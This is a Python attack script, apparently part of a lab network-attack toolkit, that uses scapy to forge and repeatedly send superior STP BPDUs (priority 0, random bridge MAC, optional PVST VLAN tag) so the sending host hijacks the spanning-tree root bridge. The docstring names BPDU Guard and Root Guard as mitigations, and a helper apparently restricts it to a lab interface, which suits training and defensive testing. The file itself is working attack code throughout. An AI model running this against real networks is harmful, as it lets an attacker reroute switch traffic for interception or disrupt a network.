#!/usr/bin/env python3
"""STP/DISCOVERY: transmit a superior (lower priority) BPDU to become the STP
root bridge. Mitigation: BPDU Guard (edge ports) + Root Guard (uplinks)."""
import os
import random
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from common import base_parser, enforce_lab_iface, require_scapy, status, run_loop, selftest_ok  # noqa: E402


def rand_mac():
    return "02:%02x:%02x:%02x:%02x:%02x" % tuple(random.randint(0, 255) for _ in range(5))


def build_bpdu(scapy_all, priority, vlan, bridge_mac):
    Dot3, LLC, STP, Dot1Q = scapy_all.Dot3, scapy_all.LLC, scapy_all.STP, scapy_all.Dot1Q
    stp = STP(rootid=priority, rootmac=bridge_mac, bridgeid=priority, bridgemac=bridge_mac,
              pathcost=0, portid=0x8001, maxage=20, hellotime=2, fwddelay=15)
    frame = Dot3(dst="01:80:c2:00:00:00", src=bridge_mac) / LLC(dsap=0x42, ssap=0x42, ctrl=3) / stp
    if vlan:
        # Per-VLAN spanning tree (PVST) carries the BPDU inside a Dot1Q tag.
        frame = Dot3(dst="01:80:c2:00:00:00", src=bridge_mac) / Dot1Q(vlan=vlan) / LLC(dsap=0x42, ssap=0x42, ctrl=3) / stp
    return frame


def main():
    p = base_parser("STP root hijack: send a superior BPDU to become root bridge")
    p.add_argument("--priority", type=int, default=0, help="forged bridge priority (lower wins)")
    p.add_argument("--vlan", type=int, default=0, help="0 = untagged / no PVST tagging")
    args = p.parse_args()
    enforce_lab_iface(args.iface)
    require_scapy()
    import scapy.all as scapy_all

    mac = rand_mac()
    pkt = build_bpdu(scapy_all, args.priority, args.vlan, mac)
    if args.selftest:
        selftest_ok("stp_root", "BPDU len=%d priority=%d" % (len(bytes(pkt)), args.priority))
        return

    def send(n):
        scapy_all.sendp(build_bpdu(scapy_all, args.priority, args.vlan, mac), iface=args.iface, verbose=0)
        status("SENT", "BPDU #%d bridge-priority=%d bridge-mac=%s" % (n + 1, args.priority, mac))

    run_loop(args.count, args.interval, send)


if __name__ == "__main__":
    main()

